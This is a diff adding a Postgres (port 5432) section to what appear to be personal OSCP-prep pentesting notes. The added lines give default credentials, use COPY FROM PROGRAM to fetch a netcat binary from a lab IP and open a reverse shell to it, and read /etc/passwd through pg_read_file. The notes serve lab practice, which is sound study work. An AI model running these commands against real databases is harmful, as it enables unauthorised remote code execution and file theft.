@@ -65,6 +65,20 @@ TFTP - Port UDP 69:
   - requires no pre authentication.
   - old protocol to read protocols. need to convert path to notation 8 in order to work or use `atftp` to get it working.
 
+POSTGRES - Port 5432:
+  - Default creds are postgres:postgres
+  - We can create table to execute cmd, like below:
+    - CREATE TABLE cmd_exec(cmd_output text);
+    - COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
+    - DELETE FROM cmd_exec;
+    - COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
+  - Else if we can't create table we can read local files and list dirs via:
+    - select * from pg_ls_dir('/tmp');
+    - select * from pg_read_file('/etc/passwd' , 0 , 1000000);   
+  - Similar machine nibles in pg paractice.
+  
+  
+  
 * these ports didn't serve a great deal in gaining initial shell as per OSCP prep, and hence should be less on priority.
 
 
